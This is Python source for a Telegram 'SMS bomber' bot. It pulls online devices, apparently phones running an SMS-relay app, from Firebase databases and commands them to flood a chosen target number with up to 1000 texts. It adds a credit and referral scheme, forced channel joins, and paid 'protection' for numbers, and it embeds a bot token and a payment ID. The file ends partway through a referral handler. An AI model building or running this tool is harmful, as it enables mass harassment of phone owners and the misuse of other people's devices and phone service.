import asyncio, json, os, re, time, logging
from datetime import datetime
from io import BytesIO
from typing import Dict, List, Optional
import aiohttp
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile, BufferedInputFile

try:
    import qrcode
    QR_AVAILABLE = True
except ImportError:
    QR_AVAILABLE = False

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s — %(message)s")
log = logging.getLogger("SMSBomber")

# ════════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════════
BOT_TOKEN = "8231418860:AAFugFDufNiWPOKQK5Gqshtpy6y4DpVJY1Y"
OWNER_ID = 8679787798
DATA_FILE = "bomber_data.json"
VERSION = "v6.4"

MAX_CONCURRENT = 40
DISPATCH_STAGGER = 0.03
MAX_COUNT = 1000
RETRY_PER_SMS = 1

WELCOME_CREDITS = 599
REFERRAL_REWARD = 999

FORCE_JOIN_CHANNELS = ["@tchbsterarmy", "@errorarmy1"]

PROTECTION_PRICE = "10 Rs"
PAYMENT_UPI = "8707210511@fam"
PAYMENT_NAME = "SMS Bomber"

# ════════════════════════════════════════════════════════════════════
# PREMIUM CUSTOM EMOJIS
# ════════════════════════════════════════════════════════════════════
CUSTOM_EMOJIS: Dict[str, tuple] = {
    "launch":         ("🎉", "6291743702679294478"),
    "task_done":      ("😁", "5337305337038909906"),
    "credit":         ("💳", "5445353829304387411"),
    "dashboard":      ("💓", "5256227233642605352"),
    "do_task":        ("🫡", "5460865799478593516"),
    "smm":            ("😈", "6292039222199063035"),
    "ai_support":     ("🤖", "5321100459790838211"),
    "my_orders":      ("👀", "5210956306952758910"),
    "share":          ("🫂", "6291721892835365542"),
    "join_updates":   ("👀", "6298788673110410889"),
    "ig_button":      ("📱", "5319160079465857105"),
    "tg_button":      ("📱", "5330237710655306682"),
    "verify":         ("✅", "6084779072750097974"),
    "earn_credit":    ("➗", "5321506952675597305"),
    "back":           ("🔙", "5253997076169115797"),
    "cross":          ("❌", "5210952531676504517"),
    "blocked":        ("🚫", "5240241223632954241"),
    "delete":         ("🗑", "5445267414562389170"),
    "pin":            ("📌", "5397782960512444700"),
    "gift":           ("🎁", "6093890283227848557"),
    "premium":        ("💎", "5427168083074628963"),
    "crown":          ("👑", "6237864166879663987"),
    "referral":       ("📩", "5285184156555306745"),
    "money":          ("💵", "5321506952675597305"),
    "fire":           ("🔥", "6235628846855492222"),
    "star":           ("⭐", "6237702328216982810"),
    "bolt":           ("⚡", "5456140674028019486"),
    "top":            ("🔝", "5415655814079723871"),
    "bomb":           ("💣", "6235628846855492222"),
    "shield":         ("🛡️", "5427168083074628963"),
    "target":         ("🎯", "6235628846855492222"),
    "phone":          ("📞", "5319160079465857105"),
    "rocket":         ("🚀", "6291743702679294478"),
    "chart":          ("📊", "5210956306952758910"),
    "megaphone":      ("📢", "5285184156555306745"),
    "tools":          ("🛠️", "5445267414562389170"),
    "stop":           ("⏹", "5210952531676504517"),
    "info":           ("ℹ️", "5224596414415256150"),
}


def ce(key: str) -> str:
    """Inline premium-emoji tag — for MESSAGE TEXT only."""
    if key not in CUSTOM_EMOJIS:
        return ""
    char, eid = CUSTOM_EMOJIS[key]
    return f'<tg-emoji emoji-id="{eid}">{char}</tg-emoji>'


def emoji_id(key: str) -> Optional[str]:
    if key not in CUSTOM_EMOJIS:
        return None
    return CUSTOM_EMOJIS[key][1]


_TG_EMOJI_STRIP = re.compile(r'<tg-emoji emoji-id="\d+">(.+?)</tg-emoji>', re.DOTALL)


def _strip_premium(text: str) -> str:
    return _TG_EMOJI_STRIP.sub(r"\1", text)


# ════════════════════════════════════════════════════════════════════
# SAFE SEND / EDIT — two-tier fallback
# ════════════════════════════════════════════════════════════════════
async def safe_send(bot: Bot, chat_id: int, text: str,
                    reply_markup=None, disable_preview: bool = True):
    try:
        return await bot.send_message(
            chat_id, text, reply_markup=reply_markup,
            parse_mode="HTML", disable_web_page_preview=disable_preview)
    except Exception as e:
        log.debug(f"safe_send primary failed: {e}")
    try:
        return await bot.send_message(
            chat_id, _strip_premium(text), reply_markup=reply_markup,
            parse_mode="HTML", disable_web_page_preview=disable_preview)
    except Exception as e2:
        log.error(f"safe_send ultimate failure: {e2}")
        return None


async def safe_edit(bot: Bot, chat_id: int, msg_id: int, text: str,
                    reply_markup=None, disable_preview: bool = True):
    try:
        return await bot.edit_message_text(
            text, chat_id=chat_id, message_id=msg_id,
            reply_markup=reply_markup,
            parse_mode="HTML", disable_web_page_preview=disable_preview)
    except Exception as e:
        log.debug(f"safe_edit primary failed: {e}")
    try:
        return await bot.edit_message_text(
            _strip_premium(text), chat_id=chat_id, message_id=msg_id,
            reply_markup=reply_markup,
            parse_mode="HTML", disable_web_page_preview=disable_preview)
    except Exception as e2:
        log.debug(f"safe_edit fallback failed: {e2}")
        return None


# ════════════════════════════════════════════════════════════════════
# UI HELPERS
# ════════════════════════════════════════════════════════════════════
SC_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ',
    'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
    'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
    'y': 'ʏ', 'z': 'ᴢ',
}


def sc(text: str) -> str:
    if not isinstance(text, str):
        return str(text)
    parts = re.split(r'(<[^>]+>)', text)
    for i in range(0, len(parts), 2):
        parts[i] = "".join(SC_MAP.get(c.lower(), c) for c in parts[i])
    return "".join(parts)


DIV = "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>"
DIV2 = "<b>────────────────────────</b>"


def B(t):  return f"<b>{t}</b>"
def C(t):  return f"<code>{t}</code>"
def It(t): return f"<i>{t}</i>"


# ════════════════════════════════════════════════════════════════════
# BUTTON FACTORY — with premium emoji icons
# ════════════════════════════════════════════════════════════════════
try:
    types.InlineKeyboardButton(text="t", callback_data="t", style="primary")
    STYLE_SUPPORTED = True
    log.info("✅ Styled buttons supported (Bot API 9.4+)")
except Exception:
    STYLE_SUPPORTED = False
    log.warning("⚠️ Styled buttons NOT supported")


def _make_btn(text: str, callback_data: str = None, url: str = None,
              style: str = "primary", emoji_key: str = None):
    base = {"text": text}
    if callback_data is not None:
        base["callback_data"] = callback_data
    if url is not None:
        base["url"] = url

    attempts = []
    full = dict(base)
    if style and STYLE_SUPPORTED:
        full["style"] = style
    eid = emoji_id(emoji_key) if emoji_key else None
    if eid and STYLE_SUPPORTED:
        full["icon_custom_emoji_id"] = eid
    attempts.append(full)

    if eid:
        no_icon = dict(base)
        if style and STYLE_SUPPORTED:
            no_icon["style"] = style
        attempts.append(no_icon)

    if style and STYLE_SUPPORTED:
        s_only = dict(base)
        s_only["style"] = style
        attempts.append(s_only)

    attempts.append(dict(base))

    for kwargs in attempts:
        try:
            return types.InlineKeyboardButton(**kwargs)
        except Exception:
            continue
    return types.InlineKeyboardButton(text=str(text)[:60], callback_data="noop")


def kb(rows):
    keyboard = []
    for row in rows:
        btn_row = []
        for item in row:
            try:
                if isinstance(item, tuple):
                    text = item[0]
                    cb = item[1] if len(item) > 1 else None
                    style = item[2] if len(item) > 2 else "primary"
                    emoji = item[3] if len(item) > 3 else None
                    if cb and isinstance(cb, str) and cb.startswith("http"):
                        btn_row.append(_make_btn(text, url=cb, style=style, emoji_key=emoji))
                    else:
                        btn_row.append(_make_btn(text, callback_data=cb, style=style, emoji_key=emoji))
                elif isinstance(item, dict):
                    btn_row.append(_make_btn(
                        item.get("text", ""),
                        callback_data=item.get("callback"),
                        url=item.get("url"),
                        style=item.get("style", "primary"),
                        emoji_key=item.get("emoji"),
                    ))
            except Exception as e:
                log.warning(f"kb() button error: {e}")
        if btn_row:
            keyboard.append(btn_row)
    return types.InlineKeyboardMarkup(inline_keyboard=keyboard)


# ════════════════════════════════════════════════════════════════════
# FORCE JOIN
# ════════════════════════════════════════════════════════════════════
async def check_fj(bot: Bot, user_id: int, channels: list) -> bool:
    if not channels:
        return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ["left", "kicked", None]:
                return False
        except Exception:
            return False
    return True


async def send_fj_ui(event, channels: list):
    text = (
        f"{DIV}\n"
        f"{ce('blocked')} {B(sc('access locked'))}\n"
        f"{DIV2}\n"
        f"{sc('join the channels below, then tap')} {B(sc('check again'))} {sc('to continue.')}\n"
        f"{DIV2}\n"
    )
    kb_rows = []
    for i, ch in enumerate(channels):
        text += f"{ce('pin')} {C(ch)}\n"
        url = f"https://t.me/{ch.replace('@', '')}"
        kb_rows.append([(sc(f"join channel {i+1}"), url, "primary", "join_updates")])
    kb_rows.append([(sc("check again"), "fj_verify", "success", "verify")])
    kb_rows.append([(sc("restart"), "fj_restart", "danger", "back")])
    markup = kb(kb_rows)

    if isinstance(event, types.Message):
        await safe_send(event.bot, event.chat.id, text, reply_markup=markup)
    else:
        if not await safe_edit(event.bot, event.message.chat.id,
                               event.message.message_id, text, reply_markup=markup):
            await safe_send(event.bot, event.message.chat.id, text, reply_markup=markup)


# ════════════════════════════════════════════════════════════════════
# FSM STATES
# ════════════════════════════════════════════════════════════════════
class Form(StatesGroup):
    fb_add_url = State()
    fb_add_api = State()
    bomb_number = State()
    bomb_message = State()
    bomb_count = State()
    protect_utr = State()
    protect_number = State()
    admin_ban = State()
    broadcast_msg = State()
    admin_credit_target = State()
    admin_credit_amount = State()


# ════════════════════════════════════════════════════════════════════
# STORAGE
# ════════════════════════════════════════════════════════════════════
def default_data():
    return {
        "admins": [OWNER_ID], "firebases": [], "banned": [], "schedules": [],
        "protected_numbers": [], "protection_requests": [], "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0},
    }


def load() -> dict:
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
            for k, v in default_data().items():
                if k not in d:
                    d[k] = v
            return d
    except Exception as e:
        log.error(f"load() error: {e}")
    return default_data()


def save(d: dict):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(d, f, indent=2)
    except Exception as e:
        log.error(f"save() error: {e}")


def is_admin(uid, d):  return uid in d.get("admins", []) or uid == OWNER_ID
def is_banned(uid, d): return uid in d.get("banned", [])


def user_record(d: dict, uid: int) -> dict:
    users = d.setdefault("users", {})
    key = str(uid)
    if key not in users:
        users[key] = {
            "credits": 0, "referrals": 0, "referred_by": 0,
            "username": "", "first_name": "",
            "joined": datetime.now().isoformat(), "is_new": True,
        }
    return users[key]


def get_credits(d: dict, uid: int) -> int:
    return int(d.get("users", {}).get(str(uid), {}).get("credits", 0))


def add_credits(d: dict, uid: int, amount: int) -> int:
    rec = user_record(d, uid)
    rec["credits"] = int(rec.get("credits", 0)) + int(amount)
    if rec["credits"] < 0:
        rec["credits"] = 0
    return rec["credits"]


def credit_tier(credits: int) -> str:
    if credits >= 10000: return "ᴇʟɪᴛᴇ ᴏᴘᴇʀᴀᴛᴏʀ"
    if credits >= 3000:  return "ᴘʀᴏ ʙᴏᴍʙᴇʀ"
    if credits >= 1000:  return "ꜱᴛʀɪᴋᴇʀ"
    if credits >= 500:   return "ᴄᴀᴅᴇᴛ"
    if credits > 0:      return "ʀᴇᴄʀᴜɪᴛ"
    return "ɴᴏ ʀᴀɴᴋ"


# ════════════════════════════════════════════════════════════════════
# FIREBASE
# ════════════════════════════════════════════════════════════════════
_http_session: Optional[aiohttp.ClientSession] = None


async def get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=200, limit_per_host=50, ttl_dns_cache=300, force_close=False)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session


async def close_session():
    global _http_session
    if _http_session and not _http_session.closed:
        await _http_session.close()
    _http_session = None


async def fb_get(base: str, path: str, api_key: str = "") -> dict:
    url = base.rstrip("/") + path
    if api_key:
        url += f"?auth={api_key}"
    session = await get_session()
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status == 200:
                txt = await r.text()
                return {} if txt in ("null", "") else json.loads(txt)
    except Exception as e:
        log.error(f"fb_get error: {e}")
    return {}


async def fb_put(base: str, path: str, payload: dict, api_key: str = "") -> bool:
    url = base.rstrip("/") + path
    if api_key:
        url += f"?auth={api_key}"
    session = await get_session()
    for attempt in range(1 + RETRY_PER_SMS):
        try:
            async with session.put(url, json=payload,
                                   timeout=aiohttp.ClientTimeout(total=12)) as r:
                if 200 <= r.status < 300:
                    return True
        except Exception as e:
            log.debug(f"fb_put attempt {attempt+1} error: {e}")
        if attempt < RETRY_PER_SMS:
            await asyncio.sleep(0.2)
    return False


# ════════════════════════════════════════════════════════════════════
# BOMB ENGINE
# ════════════════════════════════════════════════════════════════════
def is_device_online(device_data: dict) -> bool:
    for flag in ["isOnline", "online", "connected", "status"]:
        if flag in device_data and device_data[flag] in (True, 1, "online", "active", "true"):
            return True
    return False


async def discover_online_devices(fb: dict) -> List[dict]:
    data = await fb_get(fb["url"], "/clients.json", fb.get("api_key", ""))
    if not data or not isinstance(data, dict):
        return []
    devices = []
    for device_id, device_data in data.items():
        if not is_device_online(device_data):
            continue
        sims = device_data.get("sims", [])
        if not sims:
            sims = [{"simSlotIndex": 0, "phoneNumber": device_data.get("phoneNumber", "")}]
        for sim in sims:
            devices.append({
                "fb_id": fb["id"], "fb_url": fb["url"], "api_key": fb.get("api_key", ""),
                "device_id": device_id,
                "device_name": device_data.get("deviceName", device_id),
                "sim_slot": sim.get("simSlotIndex", 0),
                "phone_number": sim.get("phoneNumber", ""),
                "battery": device_data.get("battery", 0),
            })
    return devices


async def discover_all_devices(firebases: List[dict]) -> List[dict]:
    tasks = [discover_online_devices(fb) for fb in firebases]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    all_devices = []
    for res in results:
        if isinstance(res, list):
            all_devices.extend(res)
    return all_devices


async def send_single_sms(device: dict, to: str, message: str) -> bool:
    payload = {
        "from": device["sim_slot"], "to": to.strip(), "message": message.strip(),
        "isSended": False, "timestamp": int(time.time()),
        "deviceId": device["device_id"], "simSlot": device["sim_slot"],
    }
    path = f"/clients/{device['device_id']}/webhookEvent/sendSms.json"
    return await fb_put(device["fb_url"], path, payload, device.get("api_key", ""))


_bombing_tasks: Dict[int, asyncio.Task] = {}
_bombing_status: Dict[int, dict] = {}


def _progress_bar(done: int, total: int, length: int = 15) -> str:
    filled = int(length * done / max(1, total))
    return "█" * filled + "░" * (length - filled)


async def bomber_worker(bot: Bot, user_id: int, number: str, message: str,
                        requested_count: int, schedule_id: str = None):
    d = load()
    firebases = d.get("firebases", [])

    if not firebases:
        await safe_send(bot, user_id,
            f"{DIV}\n{ce('cross')} {sc('no firebase nodes configured, contact admin.')}\n{DIV}")
        return

    credits = get_credits(d, user_id)
    if credits <= 0:
        await safe_send(bot, user_id,
            f"{DIV}\n"
            f"{ce('blocked')} {B(sc('insufficient credits'))}\n"
            f"{DIV2}\n"
            f"{sc('you have')} {C('0 credits')} {sc('— you need at least 1 credit to send an sms.')}\n"
            f"{sc('invite friends via refer & earn to get 999 credits per referral!')}\n"
            f"{DIV}")
        return

    effective_count = min(requested_count, credits)
    capped = effective_count < requested_count

    all_devices = await discover_all_devices(firebases)
    if not all_devices:
        await safe_send(bot, user_id,
            f"{DIV}\n{ce('cross')} {sc('no online devices found right now.')}\n{DIV}")
        return

    status_msg = await safe_send(bot, user_id,
        f"{DIV}\n"
        f"{ce('bomb')} {B(sc('bombing started'))}\n"
        f"{DIV2}\n"
        f"{ce('phone')} {sc('devices online')}: {B(str(len(all_devices)))}\n"
        f"{ce('target')} {sc('target')}: {C(number)}\n"
        f"{ce('bolt')} {sc('sending')}: {B(str(effective_count))} {sc('sms')}"
        + (f"\n{ce('info')} {sc('capped by your credits')}" if capped else "")
        + f"\n{DIV}")
    if not status_msg:
        return
    msg_id = status_msg.message_id

    sent = 0
    failed = 0
    start_time = time.time()
    total_devices = len(all_devices)
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    counters_lock = asyncio.Lock()

    _bombing_status[user_id] = {
        "total": effective_count, "sent": 0, "failed": 0,
        "devices": total_devices, "start": start_time,
        "running": True, "number": number,
    }

    # ── progress reporter ────────────────────────────
    async def progress_loop():
        while _bombing_status.get(user_id, {}).get("running"):
            await asyncio.sleep(2.0)
            done = sent + failed
            pct = int(done / effective_count * 100) if effective_count else 0
            bar = _progress_bar(done, effective_count)
            elapsed = int(time.time() - start_time)
            rate = round(done / elapsed, 1) if elapsed > 0 else 0
            try:
                await safe_edit(bot, user_id, msg_id,
                    f"{DIV}\n"
                    f"{ce('bomb')} {B(sc('bombing in progress'))}\n"
                    f"{DIV2}\n"
                    f"{ce('phone')} {sc('target')}: {C(number)}\n"
                    f"{ce('verify')} {sc('sent')}: {B(str(sent))}  "
                    f"{ce('cross')} {sc('failed')}: {B(str(failed))}\n"
                    f"{ce('chart')} {C(bar)} {pct}%\n"
                    f"{ce('bolt')} {sc('rate')}: {C(str(rate) + ' sms/s')}  "
                    f"{sc('elapsed')}: {C(str(elapsed) + 's')}\n"
                    f"{DIV2}\n"
                    f"{It(sc('use /stop to cancel anytime'))}\n"
                    f"{DIV}")
            except Exception:
                pass

    progress_task = asyncio.create_task(progress_loop())

    async def worker(idx: int):
        nonlocal sent, failed
        async with semaphore:
            if user_id not in _bombing_tasks or _bombing_tasks[user_id].cancelled():
                return
            device = all_devices[idx % total_devices]
            try:
                ok = await send_single_sms(device, number, message)
            except Exception:
                ok = False
            async with counters_lock:
                if ok:
                    sent += 1
                else:
                    failed += 1
                st = _bombing_status.get(user_id)
                if st:
                    st["sent"] = sent
                    st["failed"] = failed

    async def launcher():
        tasks = []
        for i in range(effective_count):
            if user_id not in _bombing_tasks or _bombing_tasks[user_id].cancelled():
                break
            tasks.append(asyncio.create_task(worker(i)))
            await asyncio.sleep(DISPATCH_STAGGER)
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    await launcher()

    _bombing_status[user_id]["running"] = False
    progress_task.cancel()
    try:
        await progress_task
    except Exception:
        pass

    used = sent + failed
    d = load()
    add_credits(d, user_id, -used)
    new_balance = get_credits(d, user_id)
    d["stats"]["total_sent"] = d["stats"].get("total_sent", 0) + sent
    d["stats"]["total_failed"] = d["stats"].get("total_failed", 0) + failed
    d["stats"]["total_bombings"] = d["stats"].get("total_bombings", 0) + 1
    save(d)

    rate = round((sent / used) * 100, 1) if used else 0
    total_elapsed = int(time.time() - start_time)

    await safe_edit(bot, user_id, msg_id,
        f"{DIV}\n"
        f"{ce('task_done')} {B(sc('bombing completed'))} {ce('launch')}\n"
        f"{DIV2}\n"
        f"{ce('phone')} {sc('target')}: {C(number)}\n"
        f"{ce('verify')} {sc('sent')}: {B(str(sent))}\n"
        f"{ce('cross')} {sc('failed')}: {B(str(failed))}\n"
        f"{ce('bolt')} {sc('time')}: {C(str(total_elapsed) + 's')}\n"
        f"{ce('chart')} {sc('success rate')}: {B(str(rate) + '%')}\n"
        f"{DIV2}\n"
        f"{ce('credit')} {sc('credits used')}: {C(str(used))}\n"
        f"{ce('money')} {sc('remaining balance')}: {C(str(new_balance) + ' credits')}\n"
        f"{DIV}")

    _bombing_tasks.pop(user_id, None)


async def start_bombing(bot: Bot, user_id: int, number: str, message: str,
                        count: int, schedule_id: str = None):
    if user_id in _bombing_tasks:
        try:
            _bombing_tasks[user_id].cancel()
        except Exception:
            pass
        await asyncio.sleep(0.3)
    task = asyncio.create_task(
        bomber_worker(bot, user_id, number, message, count, schedule_id))
    _bombing_tasks[user_id] = task
    return task


def stop_bombing(user_id: int) -> bool:
    if user_id in _bombing_tasks:
        try:
            _bombing_tasks[user_id].cancel()
        except Exception:
            pass
        _bombing_tasks.pop(user_id, None)
        return True
    return False


# ════════════════════════════════════════════════════════════════════
# KEYBOARDS
# ════════════════════════════════════════════════════════════════════
def main_menu(uid, d):
    rows = []
    if is_admin(uid, d):
        rows.append([(sc("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ"), "admin:panel", "primary", "crown")])
    rows.append([(sc("ᴛᴀʀɢᴇᴛ ʙᴏᴍʙɪɴɢ"), "bomb:start", "danger", "bomb")])
    rows.append([(sc("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ"), "protect:start", "success", "shield")])
    rows.append([
        (sc("ᴍʏ sᴛᴀᴛs"), "stats:show", "primary", "chart"),
        (sc("ʀᴇꜰᴇʀ & ᴇᴀʀɴ"), "referral:show", "success", "referral"),
    ])
    rows.append([(sc("ʜᴇʟᴘ"), "help:show", "primary", "ai_support")])
    return kb(rows)


def admin_panel_kb(d):
    pending_reqs = len([r for r in d.get("protection_requests", [])
                        if r.get("status") == "pending"])
    return kb([
        [(sc("ᴀᴅᴅ ꜰɪʀᴇʙᴀsᴇ"), "admin:fb_add", "success", "bolt"),
         (sc("ʟɪsᴛ ɴᴏᴅᴇs"), "admin:fb_list", "primary", "pin")],
        [(sc(f"ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ({pending_reqs})"), "admin:protection", "primary", "shield")],
        [(sc("sᴛᴀᴛs"), "admin:stats", "primary", "chart"),
         (sc("ʙʀᴏᴀᴅᴄᴀsᴛ"), "admin:broadcast", "success", "megaphone")],
        [(sc("ᴍᴀɴᴀɢᴇ ᴄʀᴇᴅɪᴛs"), "admin:credits", "primary", "credit")],
        [(sc("ᴀᴅᴍɪɴs"), "admin:admins", "primary", "crown")],
        [(sc("ʙᴀɴ ᴜsᴇʀ"), "admin:ban", "danger", "blocked"),
         (sc("ᴜɴʙᴀɴ ᴜsᴇʀ"), "admin:unban", "success", "verify")],
        [(sc("ᴅᴀᴛᴀʙᴀsᴇ"), "admin:db_tools", "primary", "tools")],
        [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
    ])


def back_button(callback: str = "home", label: str = "back"):
    return kb([[(sc(label), callback, "danger", "back")]])


# ════════════════════════════════════════════════════════════════════
# QR
# ════════════════════════════════════════════════════════════════════
def build_upi_qr(upi_id: str, name: str, amount: float, note: str = "") -> Optional[bytes]:
    if not QR_AVAILABLE:
        return None
    try:
        upi_uri = f"upi://pay?pa={upi_id}&pn={note or name}&am={amount}&cu=INR"
        img = qrcode.make(upi_uri)
        buf = BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except Exception as e:
        log.error(f"QR build failed: {e}")
        return None


# ════════════════════════════════════════════════════════════════════
# ROUTER
# ════════════════════════════════════════════════════════════════════
R = Router()
_bot_username_cache: str = ""


async def get_bot_username(bot: Bot) -> str:
    global _bot_username_cache
    if not _bot_username_cache:
        try:
            me = await bot.get_me()
            _bot_username_cache = me.username or ""
        except Exception:
            _bot_username_cache = ""
    return _bot_username_cache


async def _send_dashboard(bot: Bot, chat_id: int, uid: int,
                          edit: bool = False, msg_id: int = None):
    d = load()
    rec = user_record(d, uid)
    credits = int(rec.get("credits", 0))
    referrals = int(rec.get("referrals", 0))
    tier = credit_tier(credits)

    bot_username = await get_bot_username(bot)
    invite_link = f"https://t.me/{bot_username}?start=ref_{uid}" if bot_username else f"ref_{uid}"

    text = (
        f"{DIV}\n"
        f"{ce('bomb')} {B(sc('nuke sms bomber'))} {ce('bomb')}\n"
        f"{DIV2}\n"
        f"{ce('crown')} {sc('rank')}: {B(sc(tier))}\n"
        f"{ce('money')} {sc('balance')}: {C(str(credits) + ' credits')}\n"
        f"{ce('referral')} {sc('referrals')}: {C(str(referrals))}\n"
        f"{DIV2}\n"
        f"{ce('pin')} {B(sc('your invite link'))}:\n"
        f"{C(invite_link)}\n"
        f"{DIV2}\n"
        f"{ce('earn_credit')} {sc('earn 999 credits per invited friend!')}\n"
        f"{DIV}"
    )
    markup = main_menu(uid, d)

    if edit and msg_id:
        if await safe_edit(bot, chat_id, msg_id, text, reply_markup=markup):
            return
    await safe_send(bot, chat_id, text, reply_markup=markup)


# ─── /start ─────────────────────────────────────────────────────────
@R.message(Command("start"))
async def cmd_start(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()

    if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(msg, FORCE_JOIN_CHANNELS)
        return

    if is_banned(uid, d):
        await safe_send(msg.bot, msg.chat.id,
            f"{DIV}\n{ce('blocked')} {sc('you are banned from using this bot.')}\n{DIV}")
        return

    parts = msg.text.split(maxsplit=1)
    payload = parts[1].strip() if len(parts) > 1 else ""
    referrer_id = 0
    if payload.startswith("ref_"):
        try:
            candidate = int(payload[4:])
            if candidate != uid:
                referrer_id = candidate
        except Exception:
            pass

    users = d.setdefault("users", {})
    key = str(uid)
    is_new = key not in users

    if is_new:
        rec = user_record(d, uid)
        rec["credits"] = WELCOME_CREDITS
        rec["referred_by"] = referrer_id
        rec["is_new"] = False

        if referrer_id and str(referrer_id) in users:
            users[str(referrer_id)]["referrals"] = users[str(referrer_id)].get("referrals", 0) + 1
            add_credits(d, referrer_id, REFERRAL_REWARD)
            try:
                await safe_send(msg.bot, referrer_id,
                    f"{DIV}\n"
                    f"{ce('launch')} {B(sc('referral reward received!'))}\n"
                    f"{DIV2}\n"
                    f"{ce('do_task')} {sc('a new user joined via your invite link.')}\n"
                    f"+{C(str(REFERRAL_REWARD) + ' credits')} {sc('have been added to your balance!')}\n"
                    f"{DIV}")
            except Exception:
                pass

    rec = user_record(d, uid)
    rec["username"] = msg.from_user.username or ""
    rec["first_name"] = msg.from_user.first_name or ""
    save(d)

    # For brand-new users send welcome card first (no animation), then dashboard
    if is_new:
        await safe_send(msg.bot, msg.chat.id,
            f"{DIV}\n"
            f"{ce('launch')} {B(sc('welcome to nuke bomber!'))} {ce('launch')}\n"
            f"{DIV2}\n"
            f"{ce('gift')} {sc('welcome bonus')}: {C('+' + str(WELCOME_CREDITS) + ' credits')}\n"
            f"{ce('rocket')} {sc('you can send up to')} {B(str(WELCOME_CREDITS))} {sc('sms right away.')}\n"
            f"{DIV2}\n"
            f"{ce('earn_credit')} {sc('invite friends to earn 999 credits each!')}\n"
            f"{DIV}")

    await _send_dashboard(msg.bot, msg.chat.id, uid, edit=False)


@R.message(Command("stop"))
async def cmd_stop(msg: types.Message):
    if stop_bombing(msg.from_user.id):
        await safe_send(msg.bot, msg.chat.id,
            f"{DIV}\n{ce('stop')} {sc('bombing stopped.')}\n{DIV}")
    else:
        await safe_send(msg.bot, msg.chat.id,
            f"{DIV}\n{ce('info')} {sc('no active bombing to stop.')}\n{DIV}")


@R.message(Command("cancel"))
async def cmd_cancel(msg: types.Message, state: FSMContext):
    await state.clear()
    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n{ce('verify')} {sc('cancelled.')}\n{DIV}",
        reply_markup=main_menu(msg.from_user.id, load()))


@R.callback_query(F.data == "fj_verify")
async def cb_fj_verify(cq: types.CallbackQuery, state: FSMContext):
    if await check_fj(cq.bot, cq.from_user.id, FORCE_JOIN_CHANNELS):
        await cq.answer(sc("verified!"), show_alert=False)
        await _send_dashboard(cq.bot, cq.message.chat.id, cq.from_user.id,
                              edit=True, msg_id=cq.message.message_id)
    else:
        await cq.answer(sc("you haven't joined all channels yet!"), show_alert=True)


@R.callback_query(F.data == "fj_restart")
async def cb_fj_restart(cq: types.CallbackQuery):
    await cq.answer()
    await send_fj_ui(cq, FORCE_JOIN_CHANNELS)


@R.callback_query(F.data == "home")
async def cb_home(cq: types.CallbackQuery, state: FSMContext):
    await state.clear()
    uid = cq.from_user.id
    d = load()

    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return
    if is_banned(uid, d):
        await cq.answer(sc("you are banned."), show_alert=True)
        return

    await cq.answer()
    await _send_dashboard(cq.bot, cq.message.chat.id, uid,
                          edit=True, msg_id=cq.message.message_id)


@R.callback_query(F.data == "referral:show")
async def cb_referral(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    rec = user_record(d, uid)
    referrals = int(rec.get("referrals", 0))
    earned = referrals * REFERRAL_REWARD

    bot_username = await get_bot_username(cq.bot)
    invite_link = f"https://t.me/{bot_username}?start=ref_{uid}" if bot_username else f"ref_{uid}"

    text = (
        f"{DIV}\n"
        f"{ce('referral')} {B(sc('refer & earn'))} {ce('gift')}\n"
        f"{DIV2}\n"
        f"{ce('crown')} {B(sc('invite friends & earn rewards'))}\n"
        f"{sc('get')} {ce('earn_credit')} {C('+' + str(REFERRAL_REWARD) + ' credits')} {sc('per referral when a friend joins!')}\n"
        f"{DIV2}\n"
        f"{ce('star')} {sc('friends invited')}: {C(str(referrals))}\n"
        f"{ce('money')} {sc('total earned')}: {ce('credit')} {C(str(earned) + ' credits')}\n"
        f"{DIV2}\n"
        f"{ce('pin')} {B(sc('your unique invite link'))}:\n"
        f"{C(invite_link)}\n"
        f"{DIV2}\n"
        f"{ce('fire')} {sc('share your link to earn 999 credits per invite automatically.')}\n"
        f"{DIV}"
    )

    share_text = f"Join this SMS bomber bot and get 599 free credits! Use my link: {invite_link}"
    share_url = f"https://t.me/share/url?url={invite_link}&text={share_text}"
    markup = kb([
        [(sc("sʜᴀʀᴇ ɪɴᴠɪᴛᴇ ʟɪɴᴋ"), share_url, "success", "share")],
        [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
    ])

    await cq.answer()
